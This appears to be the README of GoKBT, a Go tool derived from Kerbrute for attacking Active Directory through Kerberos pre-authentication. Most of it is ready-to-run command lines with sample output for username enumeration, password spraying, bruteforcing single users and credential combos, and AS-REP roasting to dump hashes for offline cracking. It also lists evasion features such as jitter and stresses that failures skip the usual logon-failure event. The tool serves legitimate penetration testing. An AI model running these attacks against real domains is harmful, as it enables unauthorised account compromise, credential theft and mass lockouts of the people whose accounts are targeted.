# GoKBT (Go Kerberos Brute Tool)

A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.

**Author:** incogbyte  

## Overview

GoKBT is a Go-based tool designed to perform various Kerberos-based attacks against Windows Active Directory environments. It leverages Kerberos Pre-Authentication to validate usernames and test credentials efficiently, potentially being faster and stealthier than traditional approaches.

Bruteforcing Windows passwords with Kerberos is much faster than other approaches, and potentially stealthier since pre-authentication failures do not trigger the traditional "An account failed to log on" event 4625. With Kerberos, you can validate a username or test a login by only sending one UDP frame to the KDC (Domain Controller).

## Features

### Core Commands
- **`userenum`** - Enumerate valid domain usernames via Kerberos
- **`passwordspray`** - Test a single password against a list of users
- **`bruteuser`** - Bruteforce a single user's password from a wordlist
- **`bruteforce`** - Read username:password combos from a file or stdin and test them
- **`asreproast`** - Find users without pre-authentication and dump AS-REP hashes

### Advanced Features
- **Delay with Jitter** - Add random variation to delays to avoid detectable patterns (`--delay` + `--jitter`)
- **Max Failures Protection** - Abort after N consecutive failures to prevent accidental lockout (`--max-failures`)
- **Lockout Threshold** - Stop testing a user after N attempts to respect lockout policy (`--lockout-threshold`)
- **Output Valid Credentials** - Save only valid credentials/usernames to a separate file (`--output-valid`)
- **Resume Functionality** - Save progress and allow resuming from where it left off (`--resume`)
- **Progress Bar** - Visual feedback for large operations (`--progress`)
- **Auto Realm Discovery** - Automatically discover Kerberos realm via LDAP (`--auto-realm`)
- **KDC Delays** - Per-KDC delay configuration for load balancing (`--kdc-delays`)
- **Password Policy Check** - Check AD password policy before attempting login (`--check-password-policy`)
- **Pass the Hash** - Use NTLM hash instead of password **[WIP - Work In Progress]** (`--pass-the-hash`)
- **Silent Mode** - Hide banner and info/debug logs; only show findings/errors (`--silent`, `-s`)
- **Stop on Success** - Stop after first successful username/login (`--stop-on-success`, `--sts`)

## Installation

### Pre-compiled Binaries
Download pre-compiled binaries for Linux (ARM64, AMD64), Windows, and macOS from the releases page.

### Build from Source
```bash
git clone https://github.com/incogbyte/gokbt
cd gokbt
go build -o gokbt .
```

### Cross-compilation
Use the provided `build.sh` script to build for multiple platforms:
```bash
chmod +x build.sh
./build.sh
```

This will create binaries for:
- Linux ARM64
- Linux AMD64 (x86_64)
- Darwin (macOS)
- Windows

## Usage

### Basic Syntax
```bash
gokbt [command] [flags] [arguments]
```

### Global Flags
```
  -d, --domain string              The full domain to use (e.g. contoso.com)
      --realm string               Optional Kerberos realm override (defaults to uppercased domain)
      --dc string                  The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --auto-realm                 Attempt to discover realm via LDAP before running (requires --dc)
      --kdc-delays string          Per-KDC delay in ms, comma-separated (host:port=delay,...)
  -o, --output string              File to write logs to. Optional.
  -v, --verbose                    Log failures and errors
  -s, --silent                     Hide banner and info/debug logs; only show findings/errors
      --stop-on-success, --sts     Stop after first successful username/login
      --safe                       Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int                Threads to use (default 10)
      --delay int                  Delay in millisecond between each attempt. Will always use single thread if set
      --jitter int                 Random jitter in ms to add/subtract from delay (e.g. --delay 100 --jitter 50 = 50-150ms)
      --downgrade                  Force downgraded encryption type (arcfour-hmac-md5)
      --hash-file string           File to save AS-REP hashes to (if any captured), otherwise just logged
      --max-failures int           Abort after N consecutive failures (0 = disabled)
      --lockout-threshold int      Stop testing a user after N attempts (0 = disabled)
      --output-valid string        File to save valid usernames/credentials
      --resume string              Resume file to save/load progress
      --progress                   Show progress bar
      --pass-the-hash string       Use NTLM hash instead of password (format: hex hash) [WIP - Work In Progress]
      --check-password-policy      Check AD password policy before attempting login (requires --dc)
```

## Commands

### 1. User Enumeration (`userenum`)

Enumerate valid usernames by sending TGT requests with no pre-authentication. If the KDC responds with a `PRINCIPAL UNKNOWN` error, the username does not exist. If the KDC prompts for pre-authentication, the username exists.

**Note:** This does not cause login failures and will not lock out accounts.

**Example:**
```bash
gokbt userenum -d dc.local usernames.txt
```

**With additional features:**
```bash
gokbt userenum -d dc.local --dc 10.10.10.1 usernames.txt \
  --auto-realm \
  --output-valid valid_users.txt \
  --progress \
  --resume state.json \
  --silent
```

**Output:**
```
[+] VALID USERNAME:       amata@dc.local
[+] VALID USERNAME:       thoffman@dc.local
Done! Tested 1001 usernames (2 valid) in 0.425 seconds
```

### 2. Password Spray (`passwordspray`)

Perform a horizontal brute force attack against a list of domain users. Useful for testing one or two common passwords when you have a large list of users.

**WARNING:** This will increment the failed login count and lock out accounts.

**Example:**
```bash
gokbt passwordspray -d dc.local domain_users.txt Password123
```

**With password policy check and delay:**
```bash
gokbt passwordspray -d dc.local --dc 10.10.10.1 users.txt Password123 \
  --check-password-policy \
  --delay 100 \
  --jitter 50 \
  --lockout-threshold 3 \
  --output-valid valid_creds.txt \
  --progress
```

**Output:**
```
[+] VALID LOGIN:  callen@dc.local:Password123
[+] VALID LOGIN:  eshort@dc.local:Password123
Done! Tested 2755 logins (2 successes) in 7.674 seconds
```

**Using username as password:**
```bash
gokbt passwordspray -d dc.local users.txt --user-as-pass
```

### 3. Brute User (`bruteuser`)

Traditional bruteforce attack against a single username. 

**WARNING:** Only run this if you are sure there is no lockout policy!

**Example:**
```bash
gokbt bruteuser -d dc.local passwords.lst thoffman
```

**With max failures protection:**
```bash
gokbt bruteuser -d dc.local passwords.lst thoffman \
  --max-failures 10 \
  --delay 50 \
  --progress
```

**Output:**
```
[+] VALID LOGIN:  thoffman@dc.local:Summer2017
Done! Tested 1001 logins (1 successes) in 2.711 seconds
```

### 4. Brute Force (`bruteforce`)

Read username and password combinations (in the format `username:password`) from a file or stdin and test them.

**Example:**
```bash
cat combos.lst | gokbt bruteforce -d dc.local -
```

**From file:**
```bash
gokbt bruteforce -d dc.local combos.lst \
  --output-valid valid.txt \
  --resume state.json \
  --progress
```

**Output:**
```
[+] VALID LOGIN:  athomas@dc.local:Password1234
Done! Tested 7 logins (1 successes) in 0.114 seconds
```

### 5. AS-REP Roasting (`asreproast`)

Dedicated mode to find users without pre-authentication and extract AS-REP hashes for offline cracking.

**Example:**
```bash
gokbt asreproast -d dc.local users.txt --hash-file hashes.txt
```

**With downgrade:**
```bash
gokbt asreproast -d dc.local users.txt \
  --downgrade \
  --hash-file hashes.txt \
  --progress
```

**Output:**
```
[+] jmarston has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$jmarston@dc.local:...
```

## Advanced Usage Examples

### Using Auto Realm Discovery
```bash
gokbt userenum --dc 10.10.10.1 --auto-realm users.txt
```

### Using KDC Delays for Load Balancing
```bash
gokbt passwordspray -d dc.local users.txt Password123 \
  --kdc-delays "10.10.10.1:88=100,10.10.10.2:88=150"
```

### Using Delay with Jitter
```bash
gokbt passwordspray -d dc.local users.txt Password123 \
  --delay 100 \
  --jitter 50
```
This will add a random delay between 50-150ms between attempts.

### Resume Interrupted Operations
```bash
# First run
gokbt userenum -d dc.local large_list.txt --resume state.json

# If interrupted, resume with same command
gokbt userenum -d dc.local large_list.txt --resume state.json
```

### Silent Mode (Hide Banner)
```bash
gokbt userenum -d dc.local users.txt --silent
```

### Stop on First Success
```bash
gokbt passwordspray -d dc.local users.txt Password123 --stop-on-success
```

### Check Password Policy Before Attempting
```bash
gokbt passwordspray -d dc.local --dc 10.10.10.1 users.txt Password123 \
  --check-password-policy
```

This will:
- Retrieve the domain's bad password count and observation window settings
- Check the number of failed login attempts for each user
- Only attempt a login if it won't exceed the domain's bad password count policy

## Windows Event IDs

Different commands generate different Windows event IDs:

- **User Enumeration**: Generates event ID [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) - A Kerberos authentication ticket (TGT) was requested
- **Password Spray/Brute Force**: Generates both:
  - Event ID [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) - A Kerberos authentication ticket (TGT) was requested
  - Event ID [4771](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771) - Kerberos pre-authentication failed

## Important Notes

1. **Account Lockouts**: Failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts. Use `--safe` mode to abort if any account gets locked out.

2. **Password Policy**: Use `--check-password-policy` to respect domain lockout policies and avoid accidental account lockouts.

3. **Threading**: By default, GoKBT uses 10 threads. Adjust with `-t` flag. If `--delay` is set, threading is automatically disabled (single thread).

4. **Realm vs Domain**: The tool uses the uppercased domain as the Kerberos realm by default. Use `--realm` to override or `--auto-realm` to discover automatically.

5. **Pass the Hash**: Currently marked as WIP (Work In Progress). Use with caution.

## Credits

- **Original Tool**: [Kerbrute](https://github.com/ropnop/kerbrute) by Ronnie Flathers @ropnop
- **Kerberos Library**: Huge shoutout to jcmturner for his pure Go implementation of KRB5: [gokrb5](https://github.com/jcmturner/gokrb5)

## License
This project is based on Kerbrute and maintains the same license.
